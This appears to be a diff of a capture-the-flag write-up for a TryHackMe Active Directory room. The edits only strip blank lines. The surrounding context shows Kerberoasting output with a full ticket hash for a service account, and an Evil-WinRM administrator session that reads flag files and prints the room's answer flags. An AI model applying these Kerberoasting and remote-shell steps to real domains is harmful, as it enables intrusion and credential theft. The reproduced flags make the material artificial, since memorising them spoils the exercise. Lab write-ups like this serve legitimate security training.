@@ -306,7 +306,6 @@ the following identified reasons(s);
 
      Issuer: CN=DC.COOCTUS.CORP
 
-
 Review the following certificate info before you trust it to be added as an exception.
 If you do not trust the certificate the connection atempt will be aborted:
 
@@ -319,7 +318,6 @@ If you do not trust the certificate the connection atempt will be aborted:
 
        sha1: 62765024f4d1b03511a8cf97e7012e50b85e2ff2
      sha256: 8e647bd4f67a2e100231111462848115a32758694a82d7761db3ac1240ca4b36
-
 
 Do you trust this certificate (yes/no)? yes
 Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
@@ -600,8 +598,6 @@ ServicePrincipalName  Name            MemberOf  PasswordLastSet             Last
 --------------------  --------------  --------  --------------------------  --------------------------  -----------
 HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 
 
-
-
 [-] CCache file is not found. Skipping...
 $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$c329c9963b65eb63d1ada3951158c649$20cc5f4c8c3bb8142cbaae8378d58d9371ff14a851af764212c2513005ae074a8db3b496a86143d16f6a628c259e67f5c04a53d8f02d026f036125396342f5f8fd7a10561285359c6279c42d9b852b760ac01d1ae6708b6b6903340051eda31cbdb16cb4bc3c9e24e0724c2478423d3c8bc1f3f78802234df224acdd12991b6e728fcc2e8e5cc7aadc3ed6d128e0dcff365f3e598a19c2ec4c0e967edf614b71a2f0416c70bd02907b361cb520299441d3e7525e59b62df4eaf23f4ebde1d56098b087b57b071c591804232d87890733d9e8fbcbcd13b0b2ff336ab9e5c599833b5d4b6622a270aa3d47103932efc65e1ae1b994fb2d615c51c15f7c4496c2a5bb80cca04de8daca0af4c69d71c215581deba5320aec75c3ae8103b64eec4da4985f66707257fe1f9ed7389cefff55bbc095ae40cd9c6156498c19d14dda65085f5a3dc438bb1c5323075e55e1eedab76ea9e3097c687553ddda9e43c9ecd1771e4ab61db166f29396303a2b6bb4388295463477c98144f1a60b5ef8e655798f64d999c25490d5241f23f151e54a3cf113d69ff6ed00ee882d2679a28aa7dfce00e2e287f5b7ed2a452c3dba91755448a8357cd1e512d455a20841de8706a27c4915a6cc15d18b0539c74342f9e72822372f1ff62ef072d4756adba80652e1c633bc6f9717153fb3cd8dccc8ed2b120f40af7070b3e6f9df9b254f8bed7403d2afb7fd3430364506bc4edd8abbff318369533a7c44ddcc39701e86dadd8858108d7cfcb7308fe450d62f1b3c39e3cbc6ff1a73d25dbd382237239068e2cd4d7e904904ea6a28bec4863d6d69a5f5d3b1d771534989a840629a182bccfb7287bfa74f8882a55fe98751dd8fe3653f56a8eef5a6cdb4081b464566f96a7d257bbdd42e3227f96dd8eae5278a13b628bfb933f2a55378ced62beaba698cc4662fce0541b879172335da6404f63411ad9840a560f4884b58c2d8d3a50bf907571a785dd9a8efe329767ea43e5bf4b5801688247b83ed339667ba604755e13a5f8312ef5a8cc6c1d7e1f6d7730fb7660563789844212e407994addc26adac469577a66c19f3054c76f2ed5d9465eda2cb13961bc81ebd742291f38c98a5ff8f15580814cf0dc44ad85865b150f7c1757eeec8ac8730927e5133a222c1152bd6b7a6fe7a8b33a88baa42ca9e527cff7c8202dd7b7255e64ae648163294ffa00a39883280c5de412f1b1e3be4223dd69a355bceaa7111fd84db8817bf4f3afff5c87b191765909d4ceea38f056337a8b3aea68c62a7959b752bae56d627a86cfe51e1f38c2c56dfc1906c5291aeb75677b324fb7fbe321c9a5269e4ebe81258
 
@@ -810,7 +806,6 @@ cooctus\administrator
 
 Windows IP Configuration
 
-
 Ethernet adapter Ethernet:
 
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
@@ -823,28 +818,22 @@ DC
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Shares
 *Evil-WinRM* PS C:\Shares> ls
 
-
     Directory: C:\Shares
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----         6/8/2021  12:42 PM                Home
 
-
 *Evil-WinRM* PS C:\Shares> cd Home
 *Evil-WinRM* PS C:\Shares\Home> ls
 
-
     Directory: C:\Shares\Home
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         6/8/2021  12:38 PM             28 priv-esc-2.txt
 -a----         6/7/2021   8:08 PM             22 priv-esc.txt
 -a----         6/7/2021   8:14 PM             17 user.txt
-
 
 *Evil-WinRM* PS C:\Shares\Home> type priv-esc-2.txt
 THM{Wh4t-t0-d0...Wh4t-t0-d0}
@@ -855,21 +844,16 @@ THM{Gu3st_Pl3as3}
 *Evil-WinRM* PS C:\Shares\Home> cd c:\PerfLogs\Admin\
 *Evil-WinRM* PS C:\PerfLogs\Admin> ls
 
-
     Directory: C:\PerfLogs\Admin
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         6/7/2021   8:07 PM             22 root.txt
 
-
 *Evil-WinRM* PS C:\PerfLogs\Admin> type root.txt
 THM{Cr0ccCrewStr1kes!}
 
 ```
-
-![[Pasted image 20230629215417.png]]
 
 What is the User flag?
 
